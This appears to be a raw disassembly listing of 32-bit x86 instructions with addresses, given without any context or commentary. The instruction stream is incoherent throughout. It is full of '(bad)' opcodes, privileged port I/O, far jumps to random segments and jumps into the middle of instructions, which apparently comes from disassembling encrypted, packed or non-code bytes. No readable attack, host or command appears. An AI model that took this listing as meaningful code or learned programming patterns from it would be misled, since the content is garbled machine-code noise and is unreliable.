  41b11c:	adc    esp,DWORD PTR [ebx+0x44]
  41b11f:	enter  0x7355,0x3
  41b123:	jmp    0x9552aae8
  41b128:	scas   eax,DWORD PTR es:[edi]
  41b129:	test   BYTE PTR [eax+ecx*8+0x5ce9549c],cl
  41b130:	jns    0x41b0d7
  41b132:	loopne 0x41b151
  41b134:	ins    DWORD PTR es:[edi],dx
  41b135:	fmul   QWORD PTR [edi-0x4]
  41b138:	out    0xa0,eax
  41b13a:	dec    edx
  41b13b:	sub    eax,0xa731764b
  41b140:	jmp    0x41b0d4
  41b142:	mov    ds,eax
  41b144:	dec    esi
  41b145:	iret   
  41b146:	pop    ecx
  41b147:	stc    
  41b148:	push   ebx
  41b149:	fild   WORD PTR [eax+0x58]
  41b14c:	retf   
  41b14d:	stos   BYTE PTR es:[edi],al
  41b14e:	sbb    DWORD PTR ds:0x1c094f6b,0xffffffbb
  41b155:	cmp    eax,0x9c27c79a
  41b15a:	repnz loope 0x41b1c8
  41b15d:	repz popf 
  41b15f:	ins    BYTE PTR es:[edi],dx
  41b160:	inc    ebx
  41b161:	fisttp WORD PTR [ebx-0x1195b1f0]
  41b167:	je     0x41b139
  41b169:	push   ss
  41b16a:	std    
  41b16b:	sub    bl,BYTE PTR [edi+0x179e36b0]
  41b171:	add    al,0x76
  41b173:	push   ss
  41b174:	xchg   edi,eax
  41b175:	fistp  WORD PTR [ecx]
  41b177:	daa    
  41b178:	fwait
  41b179:	mov    esi,0x8e1813b0
  41b17e:	xchg   ebp,eax
  41b17f:	xor    ch,bl
  41b181:	push   ss
  41b182:	test   DWORD PTR [edi+eiz*8-0x5f93554a],edi
  41b189:	fistp  WORD PTR [edx]
  41b18b:	sub    ah,dh
  41b18d:	or     bl,al
  41b18f:	xor    eax,0xeafd8499
  41b194:	lods   al,BYTE PTR ds:[esi]
  41b195:	cmp    al,0x70
  41b198:	mov    bl,0x60
  41b19a:	jg     0x41b164
  41b19c:	stos   BYTE PTR es:[edi],al
  41b19d:	inc    edi
  41b19e:	xor    al,bl
  41b1a0:	fdiv   QWORD PTR [edx]
  41b1a2:	or     esp,0xffffffeb
  41b1a5:	mov    esi,DWORD PTR [edx*1+0x528861bb]
  41b1ac:	icebp  
  41b1ad:	(bad)  
  41b1ae:	mov    al,0xc9
  41b1b0:	das    
  41b1b1:	push   eax
  41b1b2:	add    al,0x4b
  41b1b4:	sub    cl,BYTE PTR [ebx]
  41b1b6:	stc    
  41b1b7:	sub    eax,edi
  41b1b9:	retf   
  41b1ba:	std    
  41b1bb:	jns    0x41b229
  41b1bd:	or     cl,BYTE PTR [ecx+0x2b]
  41b1c0:	and    eax,0xc7390de
  41b1c5:	fmul   QWORD PTR [ebp-0x14]
  41b1c8:	adc    al,0x34
  41b1ca:	sbb    eax,0xd37dea97
  41b1cf:	xor    edx,ebx
  41b1d1:	lock mov al,ds:0xed645928
  41b1d7:	(bad)  
  41b1d8:	mov    al,0x55
  41b1da:	push   cs
  41b1db:	push   cs
  41b1dc:	cmp    esi,DWORD PTR [eax]
  41b1de:	jecxz  0x41b254
  41b1e0:	jmp    0x41b21d
  41b1e2:	sar    BYTE PTR [ecx+0x29],1
  41b1e5:	test   al,0xaa
  41b1e7:	stc    
  41b1e8:	test   edi,ebx
  41b1ea:	aam    0x33
  41b1ec:	push   edx
  41b1ed:	xchg   DWORD PTR [ebx+edi*2+0xbfe3520],ebp
  41b1f4:	or     DWORD PTR [ecx-0x79],ebx
  41b1f7:	sub    eax,0xbe995c5f
  41b1fc:	(bad)  
  41b1fd:	fbstp  TBYTE PTR [ecx]
  41b1ff:	add    esp,DWORD PTR [esp+ebp*4]
  41b202:	mov    bl,0x53
  41b204:	inc    eax
  41b205:	nop
  41b206:	sub    eax,DWORD PTR [ecx+0x1ba711eb]
  41b20c:	xor    eax,0xf38e9f86
  41b211:	fmul   DWORD PTR [edx+0x7a]
  41b214:	and    al,0xf5
  41b216:	jl     0x41b1f6
  41b218:	sbb    al,0xbb
  41b21a:	dec    ebp
  41b21b:	lods   eax,DWORD PTR ds:[esi]
  41b21c:	or     esi,ebx
  41b21e:	cld    
  41b21f:	imul   esi,DWORD PTR [ecx+ebx*2],0xffffffda
  41b223:	mov    ebp,0xe28d33a4
  41b228:	arpl   WORD PTR [ecx-0x53cf4f01],bx
  41b22e:	mov    edi,DWORD PTR ds:0xa8f8413
  41b234:	out    0x5c,al
  41b236:	(bad)  
  41b237:	fisttp DWORD PTR [edi]
  41b239:	imul   DWORD PTR [ecx+edx*8+0x39]
  41b23d:	jecxz  0x41b29d
  41b23f:	mov    eax,ds:0x6c33df06
  41b244:	pop    edx
  41b245:	cmp    eax,0x917f28e7
  41b24a:	std    
  41b24b:	aad    0x2c
  41b24d:	mov    esi,0xdb9d3062
  41b252:	fdivr  DWORD PTR [esi+0x48560163]
  41b258:	stc    
  41b259:	aam    0x61
  41b25b:	(bad)  [edx+0x40]
  41b25e:	std    
  41b25f:	ins    DWORD PTR es:[edi],dx
  41b260:	jmp    0x1f36:0x124ac8f9
  41b267:	mov    esp,0xb3d94856
  41b26c:	out    0x1f,al
  41b26e:	sub    al,0xc5
  41b270:	pop    eax
  41b271:	(bad)  
  41b272:	mov    ch,0xad
  41b274:	pop    ecx
  41b275:	pop    edi
  41b276:	cmp    al,0x5d
  41b278:	pop    esi
  41b279:	jl     0x41b278
  41b27b:	in     eax,0xe2
  41b27d:	je     0x41b2e7
  41b27f:	int3   
  41b280:	push   edi
  41b281:	arpl   WORD PTR ds:0x97f474c8,sp
  41b287:	jbe    0x41b230
  41b289:	jae    0x41b27b
  41b28b:	sti    
  41b28c:	jmp    0x41b2de
  41b28e:	hlt    
  41b28f:	aam    0xf0
  41b291:	or     BYTE PTR [esi+0x7d70d01a],ah
  41b297:	ret    
  41b298:	push   0xffffff8f
  41b29a:	push   cs
  41b29b:	loopne 0x41b262
  41b29d:	and    eax,0x3feb3e14
  41b2a2:	mov    al,0xc9
  41b2a4:	cmp    BYTE PTR [ebx+0x4f],0xcb
  41b2a8:	ret    0x7ecb
  41b2ab:	or     esp,esi
  41b2ad:	jae    0x41b2ad
  41b2af:	xchg   ebp,eax
  41b2b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2b1:	xor    DWORD PTR [eax],ebx
  41b2b3:	test   DWORD PTR [ebx+0x60e0a51a],edi
  41b2b9:	inc    ebp
  41b2ba:	add    BYTE PTR [eax-0x4b02bac0],0xa6
  41b2c1:	jb     0x41b27a
  41b2c3:	dec    ecx
  41b2c4:	xchg   esi,eax
  41b2c5:	jecxz  0x41b2c8
  41b2c7:	mov    dl,0x8e
  41b2c9:	inc    ebx
  41b2ca:	std    
  41b2cb:	ret    0x5649
  41b2ce:	test   BYTE PTR [ebp+0x4137e0c3],al
  41b2d4:	mov    dl,0x9e
  41b2d7:	cwde   
  41b2d8:	mov    eax,0xebec9bf7
  41b2dd:	mov    DWORD PTR [ebx+edx*1-0x5f],ecx
  41b2e1:	xchg   edi,eax
  41b2e2:	and    DWORD PTR [ebx-0x44fa1f1e],ebp
  41b2e8:	mov    WORD PTR [edx-0x55],ss
  41b2eb:	sub    BYTE PTR [ebp-0x145062bf],ah
  41b2f1:	test   eax,0x7093b4ba
  41b2f6:	sub    al,0x68
  41b2f8:	push   esi
  41b2f9:	(bad)  
  41b2fb:	adc    al,0x85
  41b2fd:	pop    esi
  41b2fe:	mov    ebp,DWORD PTR [edi]
  41b300:	shr    ebp,0xfc
  41b303:	pop    ebx
  41b304:	imul   edi,DWORD PTR [esi-0x5b1aa579],0xdfe32266
  41b30e:	out    0x37,al
  41b310:	mov    edx,0xbcb278d9
  41b315:	inc    edi
  41b316:	std    
  41b317:	es into 
  41b319:	adc    DWORD PTR [eax],ebx
  41b31b:	jae    0x41b2d5
  41b31d:	inc    esi
  41b31e:	call   0xacfb:0x2761c1c8
  41b325:	retf   
  41b326:	jbe    0x41b345
  41b328:	jmp    0x41b35d
  41b32a:	pop    ebx
  41b32b:	inc    edi
  41b32c:	pop    ebx
  41b32d:	jo     0x41b3a2
  41b32f:	scas   al,BYTE PTR es:[edi]
  41b330:	nop
  41b331:	fistp  WORD PTR [edx]
  41b333:	mov    eax,0xf7f6b6ee
  41b338:	loop   0x41b3a5
  41b33a:	add    ah,ah
  41b33c:	push   eax
  41b33d:	mov    bh,0xfc
  41b33f:	and    ecx,DWORD PTR [ecx]
  41b341:	pop    edx
  41b342:	repnz mov ch,0x90
  41b345:	(bad)  
  41b346:	dec    edi
  41b347:	enter  0x40cb,0xc6
  41b34b:	lahf   
  41b34c:	and    bl,BYTE PTR [esi+edi*4]
  41b34f:	xor    eax,0xf204afeb
  41b354:	(bad)  
  41b355:	std    
  41b356:	stos   BYTE PTR es:[edi],al
  41b357:	mov    ah,0x8d
  41b359:	fistp  QWORD PTR [ebx]
  41b35b:	nop
  41b35c:	clc    
  41b35d:	iret   
  41b35e:	sub    DWORD PTR [edx],esi
  41b360:	push   ebp
  41b361:	and    eax,0x214ea5fc
  41b366:	inc    esp
  41b367:	sbb    edi,DWORD PTR [edx+0x53103890]
  41b36d:	dec    ebx
  41b36e:	xchg   al,cl
  41b370:	into   
  41b371:	arpl   WORD PTR [edx],dx
  41b373:	fdiv   QWORD PTR [ebp+ecx*1+0x15ee39ca]
  41b37a:	call   0x244d:0xf3df760a
  41b381:	lahf   
  41b382:	out    0xc7,al
  41b384:	or     DWORD PTR [edx+0x68e767da],edi
  41b38a:	test   eax,0xe087e24a
  41b38f:	inc    edi
  41b390:	jmp    0x947c:0xcd7125b4
  41b397:	enter  0x16f1,0x37
  41b39b:	jbe    0x41b3f3
  41b39d:	mov    ebx,0x3de64ed4
  41b3a2:	stc    
  41b3a3:	aas    
  41b3a4:	cli    
  41b3a5:	lahf   
  41b3a6:	int3   
  41b3a7:	retf   0xfe70
  41b3aa:	add    al,cl
  41b3ac:	mov    al,0x50
  41b3ae:	sbb    eax,0xc46eb8cb
  41b3b3:	shr    bl,0x8e
  41b3b6:	dec    ebp
  41b3b7:	xchg   edx,esp
  41b3b9:	push   edx
  41b3ba:	sahf   
  41b3bb:	aam    0x70
  41b3bd:	fistp  WORD PTR [edi]
  41b3bf:	adc    DWORD PTR [ebp-0x17],0xffffffb0
  41b3c3:	loopne 0x41b3b8
  41b3c5:	mov    dl,0x9e
  41b3c7:	stos   BYTE PTR es:[edi],al
  41b3c8:	in     al,dx
  41b3c9:	push   ds
  41b3ca:	jbe    0x41b444
  41b3cc:	dec    ebx
  41b3cd:	leave  
  41b3ce:	cmp    DWORD PTR [ecx-0x380672ed],ecx
  41b3d4:	gs cdq 
  41b3d6:	cdq    
  41b3d7:	retf   
  41b3d8:	jne    0x41b426
  41b3da:	adc    esi,ebp
  41b3dc:	mov    al,ds:0xf45e2944
  41b3e1:	div    DWORD PTR [edx-0x1f208b89]
  41b3e7:	sbb    al,0x30
  41b3e9:	rcr    BYTE PTR [ecx-0x38],cl
  41b3ec:	xchg   esi,eax
  41b3ed:	(bad)  
  41b3ee:	mov    ?,WORD PTR [edx+0x53]
  41b3f1:	add    dh,BYTE PTR [ebp-0x2bc5f82]
  41b3f7:	and    BYTE PTR [ebx-0xb],al
  41b3fa:	fwait
  41b3fb:	cmp    cl,ah
  41b3fd:	ins    BYTE PTR es:[edi],dx
  41b3fe:	push   ds
  41b3ff:	enter  0xd1cb,0x59
  41b403:	paddsb mm3,mm4
  41b406:	fldcw  WORD PTR ds:0x71ab1be9
  41b40c:	add    ecx,DWORD PTR [edi+0x10]
  41b40f:	mov    BYTE PTR [ecx+0x20bc3635],dh
  41b415:	jmp    0x5c0d:0x25a28898
  41b41c:	xlat   BYTE PTR ds:[ebx]
  41b41d:	inc    eax
  41b41e:	std    
  41b41f:	mov    ebp,0x58316e72
  41b424:	retf   0x4ea0
  41b427:	mov    edx,0xbbeb020f
  41b42c:	lahf   
  41b42d:	sahf   
  41b42e:	add    eax,0x306f69ac
  41b433:	and    al,0x2f
  41b435:	sbb    ch,bh
  41b437:	in     al,dx
  41b438:	aaa    
  41b439:	cld    
  41b43a:	sub    BYTE PTR [ebx],cl
  41b43c:	pop    ebx
  41b43d:	cmp    eax,0x6c8cc876
  41b442:	arpl   ax,sp
  41b444:	out    0xb0,al
  41b446:	gs pop es
  41b448:	jmp    0x8e8a:0xba60782d
  41b44f:	inc    eax
  41b450:	and    DWORD PTR [esi+0x0],0xffffffc8
  41b454:	sub    DWORD PTR [edx],ebp
  41b456:	shr    BYTE PTR [ebx],0x13
  41b459:	nop
  41b45a:	sub    DWORD PTR [ebp-0x6d61b615],edi
  41b460:	ror    BYTE PTR [ebx-0x1d0e48e2],cl
  41b466:	mov    esi,DWORD PTR [ebx+0x9698fba]
  41b46c:	cmp    eax,0xb10fdf7e
  41b471:	xchg   edi,eax
  41b472:	cld    
  41b473:	stos   DWORD PTR es:[edi],eax
  41b474:	popa   
  41b475:	add    eax,0xa54b75b0
  41b47a:	and    eax,ecx
  41b47c:	(bad)  
  41b47d:	fimul  DWORD PTR [edi-0x52]
  41b480:	jl     0x41b459
  41b482:	push   edi
  41b483:	inc    ecx
  41b484:	loop   0x41b48e
  41b486:	dec    eax
  41b487:	dec    eax
  41b488:	jb     0x41b4d7
  41b48a:	inc    esp
  41b48b:	jl     0x41b458
  41b48d:	or     al,0xfc
  41b48f:	(bad)  
  41b490:	sub    dl,BYTE PTR [ebx+0x29952430]
  41b496:	nop
  41b497:	or     DWORD PTR es:[edx+0x1ebf02c],edi
  41b49e:	push   ds
  41b49f:	mov    al,0xb2
  41b4a1:	sahf   
  41b4a2:	data16 repz mov bh,0xde
  41b4a6:	fstp   DWORD PTR [esi+0x1a44e673]
  41b4ac:	test   BYTE PTR [edi-0x33],cl
  41b4af:	std    
  41b4b0:	loopne 0x41b52d
  41b4b2:	in     eax,0x47
  41b4b4:	das    
  41b4b5:	fist   DWORD PTR [edi+0x4eb868a5]
  41b4bb:	into   
  41b4bc:	retf   0x47ea
  41b4bf:	pop    esp
  41b4c0:	jmp    0x41b49e
  41b4c2:	push   ss
  41b4c3:	jae    0x41b51d
  41b4c5:	inc    edx
  41b4c6:	std    
  41b4c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4c8:	cmp    BYTE PTR [edi+0x8],cl
  41b4cb:	adc    bl,cl
  41b4cd:	es ffree st(7)
  41b4d0:	add    DWORD PTR [ebx-0x3f],0xffffffd5
  41b4d4:	or     al,0xc4
  41b4d6:	xchg   ecx,eax
  41b4d7:	in     al,dx
  41b4d8:	in     eax,dx
  41b4d9:	pop    ebp
  41b4da:	mov    cl,0xf8
  41b4dc:	retf   0xc3df
  41b4df:	xor    edx,DWORD PTR [ebp+0x4cc79ca8]
  41b4e5:	inc    esi
  41b4e6:	pop    ebp
  41b4e7:	or     BYTE PTR [ebp+0x2fcbf60f],cl
  41b4ed:	icebp  
  41b4ee:	cld    
  41b4ef:	dec    eax
  41b4f0:	dec    edi
  41b4f1:	pop    ebx
  41b4f2:	dec    esi
  41b4f3:	jne    0x41b4df
  41b4f5:	out    dx,eax
  41b4f6:	adc    al,0xc8
  41b4f8:	inc    esp
  41b4f9:	push   ebx
  41b4fa:	or     cl,ah
  41b4fc:	loope  0x41b528
  41b4fe:	sub    DWORD PTR [ecx],ecx
  41b500:	jmp    0x41b4cb
  41b502:	(bad)  
  41b504:	fbstp  TBYTE PTR [ebx]
  41b506:	jne    0x41b55b
  41b508:	ja     0x41b548
  41b50a:	rol    ebx,0x74
  41b50d:	fidivr WORD PTR [ecx+0x20c76117]
  41b513:	in     eax,dx
  41b514:	sar    dh,0xe7
  41b517:	repz xor BYTE PTR [edi+0x1],ch
  41b51b:	sub    ebx,DWORD PTR [edi+edx*1+0x6569a43d]
  41b522:	or     al,0x1
  41b524:	pop    ebx
  41b525:	xor    eax,0x5103cb16
  41b52a:	mov    ah,0x8c
  41b52c:	sub    BYTE PTR [ecx-0xc],al
  41b52f:	das    
  41b530:	add    al,0x69
  41b532:	cmp    al,0xc8
  41b534:	fsubrp st(2),st
  41b536:	nop
  41b537:	jg     0x41b5a4
  41b539:	(bad)  
  41b53b:	jnp    0x41b523
  41b53d:	cmp    BYTE PTR [ebp-0x2b2d26d],bl
  41b543:	fwait
  41b544:	popf   
  41b545:	arpl   WORD PTR [eax-0x87aaca4],ax
  41b54b:	mov    edi,0xee928865
  41b551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b552:	jmp    0x8ed59c46
  41b557:	sbb    al,0xa6
  41b559:	inc    eax
  41b55a:	mov    ebp,0x6b07ec93
  41b55f:	enter  0xa344,0xb2
  41b563:	dec    edi
  41b564:	mov    ds:0x4562a,al
  41b569:	push   0xffffffe6
  41b56b:	push   ecx
  41b56c:	jmp    0x41b5ce
  41b56e:	cmc    
  41b56f:	inc    edx
  41b570:	dec    ebp
  41b571:	mov    bh,0x5e
  41b573:	enter  0xda8d,0x3b
  41b577:	dec    ebx
  41b578:	inc    esi
  41b579:	int3   
  41b57a:	arpl   WORD PTR [eax-0x14],cx
  41b57d:	push   ecx
  41b57e:	push   edi
  41b57f:	mov    eax,ds:0x2d671c35
  41b584:	retf   
  41b585:	or     BYTE PTR [ecx],dl
  41b587:	leave  
  41b588:	xchg   esi,eax
  41b589:	cmp    ebx,eax
  41b58b:	into   
  41b58c:	adc    al,0x57
  41b58e:	lods   eax,DWORD PTR ds:[esi]
  41b58f:	and    esi,DWORD PTR [ebx]
  41b591:	clc    
  41b592:	mov    bh,0xb7
  41b594:	out    0x97,al
  41b596:	xor    ebp,ebp
  41b598:	es pop ebp
  41b59a:	lods   eax,DWORD PTR ds:[esi]
  41b59b:	cs pop edx
  41b59d:	scas   eax,DWORD PTR es:[edi]
  41b59e:	pop    edi
  41b59f:	ffree  st(6)
  41b5a1:	inc    ebp
  41b5a2:	bound  edi,QWORD PTR [esi+0x6c]
  41b5a5:	loopne 0x41b5a8
  41b5a7:	cmp    dl,dh
  41b5a9:	sbb    al,0x5f
  41b5ab:	sbb    ah,al
  41b5ad:	lock dec ebp
  41b5af:	imul   edx,DWORD PTR ds:0xe2cdc73b,0xabc7f422
  41b5b9:	dec    ebx
  41b5ba:	add    BYTE PTR [ecx],cl
  41b5bc:	cli    
  41b5bd:	cdq    
  41b5be:	(bad)
  41b5c1:	pop    edx
  41b5c2:	cli    
  41b5c3:	mov    bl,0x4b
  41b5c5:	mov    bh,0x28
  41b5c7:	jg     0x41b5ca
  41b5c9:	mov    ds:0x545b7726,eax
  41b5ce:	std    
  41b5cf:	cmc    
  41b5d0:	(bad)  
  41b5d1:	jmp    0x1be8ca12
  41b5d6:	clc    
  41b5d7:	retf   0x64ce
  41b5da:	sti    
  41b5db:	or     al,0xcd
  41b5dd:	cs mov fs,WORD PTR gs:[ebx]
  41b5e1:	cmc    
  41b5e2:	sub    cl,ah
  41b5e4:	jmp    0x41b61b
  41b5e6:	call   0x73bc5afa
  41b5eb:	or     eax,edx
  41b5ed:	fucomip st,st(1)
  41b5ef:	stc    
  41b5f0:	fsubr  QWORD PTR [eax]
  41b5f2:	sub    eax,edi
  41b5f4:	fs sub al,0x2
  41b5f7:	inc    edx
  41b5f8:	pop    ebx
  41b5f9:	xchg   ecx,eax
  41b5fa:	mov    ebp,0x547c8b19
  41b5ff:	(bad)  
  41b600:	cmc    
  41b601:	fbld   TBYTE PTR [eax]
  41b603:	dec    esp
  41b604:	sti    
  41b605:	cmp    cl,BYTE PTR [esi+0x16]
  41b608:	mov    ebp,0xee6398ba
  41b60d:	add    eax,0xff99743c
  41b612:	dec    ecx
  41b613:	xor    al,BYTE PTR [esi+0x7dc7d32b]
  41b619:	mov    ds:0xe84028ba,al
  41b61e:	(bad)  
  41b61f:	cmp    eax,0x4868c1e2
  41b624:	pop    esi
  41b625:	push   edi
  41b626:	iret   
  41b627:	add    ecx,DWORD PTR [ebx+0x199662c7]
  41b62d:	inc    ebp
  41b62e:	xchg   edx,eax
  41b62f:	enter  0x9f3e,0xf4
  41b633:	mov    dh,0xbf
  41b635:	imul   ecx,DWORD PTR ds:0x3b5fe33a,0xffffffc9
  41b63c:	in     eax,0x4
  41b63e:	mov    ecx,0xc4aa75b4
  41b643:	push   ebp
  41b644:	dec    esp
  41b645:	fistp  WORD PTR [eax-0x8]
  41b648:	aad    0x27
  41b64a:	bound  edx,QWORD PTR [ebx+0x53fd6e1e]
  41b650:	adc    edx,ecx
  41b652:	adc    esi,DWORD PTR [ebp-0x2cb6a46d]
  41b658:	adc    al,0x3f
  41b65b:	loop   0x41b648
  41b65d:	mov    bh,0x3e
  41b65f:	push   ds
  41b660:	dec    ebp
  41b661:	sar    ah,cl
  41b663:	adc    ebp,esp
  41b665:	test   eax,0xec592320
  41b66a:	jl     0x41b634
  41b66c:	jmp    0xe7ad:0xae7db64c
  41b673:	dec    edx
  41b674:	jmp    0x41b5fd
  41b676:	push   edx
  41b677:	inc    esi
  41b678:	mov    al,ds:0xfda15dac
  41b67d:	or     edi,edx
  41b67f:	sbb    al,0x66
  41b681:	and    bh,bl
  41b683:	es mov bh,0xdf
  41b686:	xor    BYTE PTR [ebp+0x79],cl
  41b689:	ret    0xa3fc
  41b68c:	popf   
  41b68d:	popf   
  41b68e:	leave  
  41b68f:	fsubr  st(1),st
  41b691:	sbb    edi,DWORD PTR [eax]
  41b693:	enter  0xbe2e,0x2a
  41b697:	pop    eax
  41b698:	(bad)  
  41b699:	popa   
  41b69a:	mov    ebx,0xb6e8e6ba
  41b69f:	jae    0x41b6d1
  41b6a1:	bound  edi,QWORD PTR [edx+eax*1-0x43e02905]
  41b6a8:	inc    esi
  41b6a9:	ror    DWORD PTR [edx-0x38],cl
  41b6ac:	pop    ds
  41b6ad:	call   0xda47:0x6a012144
  41b6b4:	jmp    0x41b664
  41b6b6:	push   ebp
  41b6b7:	lods   eax,DWORD PTR ds:[esi]
  41b6b8:	sbb    eax,0x35a35ce7
  41b6bd:	(bad)  
  41b6bf:	(bad)  es:[ecx-0x60]
  41b6c3:	pop    es
  41b6c4:	and    BYTE PTR [eax+0x25],0xa2
  41b6c8:	jmp    0x41b6a0
  41b6ca:	add    BYTE PTR [edi+eax*2-0x155f85a1],0xe9
  41b6d2:	jmp    0x8ad9:0x5d1f0af0
  41b6d9:	js     0x41b65c
  41b6db:	pop    edx
  41b6dd:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41b6df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6e0:	loop   0x41b6a0
  41b6e2:	call   DWORD PTR [edx+0x37]
  41b6e5:	lahf   
  41b6e6:	sub    al,0x5f
  41b6e8:	adc    bl,al
  41b6ea:	test   cl,bh
  41b6ec:	ss (bad) 
  41b6ee:	cld    
  41b6ef:	call   0x2102:0xd4363c49
  41b6f6:	jecxz  0x41b6c8
  41b6f8:	jae    0x41b698
  41b6fa:	or     ch,BYTE PTR [ecx]
  41b6fc:	jmp    0x41b745
  41b6fe:	mov    al,0x76
  41b700:	call   0x8cdeb3c1
  41b705:	(bad)  
  41b706:	pop    edi
  41b707:	cs out dx,al
  41b709:	and    dl,BYTE PTR [ebx-0x69]
  41b70c:	aam    0xcb
  41b70e:	ins    BYTE PTR es:[edi],dx
  41b70f:	enter  0xc3a7,0x58
  41b713:	cmc    
  41b714:	daa    
  41b715:	push   ebx
  41b716:	mov    ebx,0x6c6beb50
  41b71b:	bound  edx,QWORD PTR [edx+0x6ec00a02]
  41b721:	fisub  WORD PTR [eax]
  41b723:	jne    0x41b763
  41b725:	mov    DWORD PTR [esi-0x8],ebp
  41b728:	xchg   DWORD PTR [edi],ebx
  41b72a:	ss ret 0x7feb
  41b72e:	push   ebx
  41b72f:	mov    ds:0x7097de59,al
  41b734:	call   0x6cb0e344
  41b739:	dec    eax
  41b73a:	mov    dh,0x3c
  41b73c:	test   DWORD PTR [edx+0x68392c49],0x29c281d2
  41b746:	xlat   BYTE PTR ds:[ebx]
  41b747:	(bad)  
  41b748:	adc    ebp,ecx
  41b74a:	add    bl,0x50
  41b74d:	(bad)  
  41b74f:	dec    edi
  41b750:	retf   
  41b751:	jns    0x41b6d5
  41b753:	leave  
  41b754:	(bad)
  41b757:	enter  0x4316,0xd1
  41b75b:	mov    edi,DWORD PTR [ecx]
  41b75d:	jl     0x41b78a
  41b75f:	sub    edx,esi
  41b761:	shl    DWORD PTR [ecx-0x3a],cl
  41b764:	mov    ecx,0x777e0cdf
  41b769:	dec    eax
  41b76a:	xchg   esp,eax
  41b76b:	enter  0xcb65,0xbd
  41b76f:	jecxz  0x41b7ce
  41b771:	js     0x41b6f6
  41b773:	shr    dl,cl
  41b775:	gs jae 0x41b7b5
  41b778:	clc    
  41b779:	push   ebx
  41b77a:	out    0xca,eax
  41b77c:	mov    bh,0x7b
  41b77e:	mov    edi,0x85493fde
  41b783:	arpl   WORD PTR [eax-0x78c3f54e],cx
  41b789:	pop    ebx
  41b78a:	std    
  41b78b:	ret    0xdcc4
  41b78e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b78f:	mov    edx,DWORD PTR [edx-0x21]
  41b792:	push   ds
  41b793:	(bad)  
  41b794:	mov    ah,0x60
  41b796:	iret   
  41b797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b798:	jecxz  0x41b804
  41b79a:	std    
  41b79b:	mov    eax,ds:0xc6a322e2
  41b7a0:	leave  
  41b7a1:	inc    DWORD PTR [ebx+0x676e6dcf]
  41b7a7:	or     BYTE PTR [ebx-0x2b27767f],cl
  41b7ad:	in     al,dx
  41b7ae:	cld    
  41b7af:	jb     0x41b806
  41b7b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7b2:	arpl   WORD PTR ds:0x9cf1971c,di
  41b7b8:	xchg   esp,eax
  41b7b9:	(bad)  
  41b7bb:	push   edi
  41b7bc:	call   0xacfa:0xf6ac765e
  41b7c3:	xchg   esi,eax
  41b7c4:	jmp    0x41b757
  41b7c6:	mov    BYTE PTR [ebx],ah
  41b7c8:	fld    TBYTE PTR [ebx]
  41b7ca:	mov    ch,cl
  41b7cc:	aad    0xd6
  41b7ce:	xor    eax,0x7d795171
  41b7d3:	arpl   WORD PTR [ecx],dx
  41b7d5:	sbb    ah,BYTE PTR [eax-0x6cd2ff27]
  41b7db:	sub    al,0xeb
  41b7dd:	mov    DWORD PTR [ecx-0x6],ecx
  41b7e0:	pop    edi
  41b7e1:	fdivr  DWORD PTR [edi-0x38]
  41b7e4:	sbb    al,0x9b
  41b7e6:	pop    edx
  41b7e7:	pop    edi
  41b7e8:	inc    esp
  41b7e9:	push   es
  41b7ea:	xchg   edi,edi
  41b7ec:	jmp    0x41b85f
  41b7ee:	xor    BYTE PTR [ecx-0x46],0xd
  41b7f2:	jmp    0x3c4b7fc9
  41b7f7:	xor    ebx,DWORD PTR [esi-0x80]
  41b7fa:	loope  0x41b834
  41b7fc:	imul   edi,esi,0xffffffd4
  41b7ff:	ret    
  41b800:	or     ebp,edx
  41b802:	(bad)
  41b806:	arpl   dx,cx
  41b808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b809:	call   FWORD PTR [edi+esi*8]
  41b80c:	fucomip st,st(6)
  41b80e:	test   al,cl
  41b810:	xchg   ebx,eax
  41b811:	mov    esi,0xa6dbc7cd
  41b816:	and    edi,DWORD PTR [edx]
  41b818:	xchg   ebp,eax
  41b819:	jle    0x41b818
  41b81b:	fucomip st,st(6)
  41b81d:	popa   
  41b81e:	popa   
  41b81f:	jb     0x41b896
  41b821:	repnz xchg edi,eax
  41b823:	enter  0x3fb2,0x5d
  41b827:	push   0x13
  41b829:	xchg   BYTE PTR [eax-0x40],bh
  41b82c:	jmp    0x41b801
  41b82e:	enter  0x28a9,0x44
  41b832:	push   cs
  41b833:	scas   al,BYTE PTR es:[edi]
  41b834:	pusha  
  41b835:	in     al,dx
  41b836:	aad    0xa6
  41b838:	loope  0x41b819
  41b83a:	jmp    0xeb13:0x1d6c7f79
  41b841:	and    BYTE PTR [ebx-0x1d],ah
  41b844:	push   cs
  41b845:	(bad)  
  41b846:	ret    0x20a
  41b849:	fld    DWORD PTR [ebp+edi*4+0x115d8c30]
  41b850:	fmul   st,st(4)
  41b852:	(bad)  
  41b853:	out    dx,eax
  41b854:	neg    DWORD PTR [eax-0x20dd678e]
  41b85a:	mov    edx,0x396b64ca
  41b85f:	clc    
  41b860:	dec    ebp
  41b861:	fild   WORD PTR [edi]
  41b863:	push   edi
  41b864:	xchg   ebx,eax
  41b865:	jno    0x41b85b
  41b867:	test   al,0x58
  41b869:	ret    0xd484
  41b86c:	jmp    0x41b8c1
  41b86e:	imul   edi,DWORD PTR [edi],0x1e06f2c9
  41b874:	xchg   esi,eax
  41b875:	fld    QWORD PTR [edx-0x13]
  41b878:	test   DWORD PTR [esp+ebx*1],ebx
  41b87b:	sbb    eax,0x1aee602b
  41b880:	mov    ebx,0xeb318d59
  41b885:	mov    ecx,0xec4553b5
  41b88a:	pop    ds
  41b88b:	pop    esp
  41b88c:	leave  
  41b88d:	fcomip st,st(4)
  41b88f:	adc    al,BYTE PTR [edi+0x1a]
  41b892:	add    BYTE PTR [ebp+0x71fd3d69],dl
  41b898:	fisub  WORD PTR [esi]
  41b89a:	mov    bh,0xe7
  41b89c:	(bad)  
  41b89e:	xor    eax,0xcbdfaf16
  41b8a3:	ja     0x41b8d5
  41b8a5:	lahf   
  41b8a6:	jmp    0x41b8cb
  41b8a8:	xchg   BYTE PTR [ebp-0x6dec3c03],al
  41b8ae:	and    edx,DWORD PTR ds:0xc7d79838
  41b8b4:	into   
  41b8b5:	call   0x6ad4266b
  41b8ba:	xchg   bh,dh
  41b8bc:	jmp    0x41b93c
